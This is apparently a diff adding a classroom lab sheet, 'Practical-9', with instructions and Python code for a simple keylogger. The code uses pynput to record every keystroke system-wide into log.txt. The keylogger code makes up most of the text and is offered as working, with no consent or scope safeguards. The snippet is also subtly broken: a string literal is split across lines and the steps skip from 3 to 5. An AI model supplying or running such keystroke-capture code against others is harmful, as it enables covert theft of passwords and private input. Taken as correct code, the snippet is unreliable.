@@ -1,0 +1,19 @@
+Practical-9
+Aim: Create a simple keylogger using python
+Step-1) install pynput via pip
+pip install pynput
+
+Step-2) Open your Python IDLE and write the following code
+from pynput.keyboard import Key,Listener
+import logging 
+logging.basicConfig(filename=("log.txt"),format="You 
+Pressed"+"%(message)s",level=logging.DEBUG)
+def on_press(key): 
+	logging.info(str(key))
+with Listener(on_press=on_press) as listener:
+	listener.join()
+
+Step 3) Run the Code and type something in the idle window or anywhere else or just press some
+keys on the keyboard
+
+Step 5) Once done, stop code execution and print the contents of log.txt
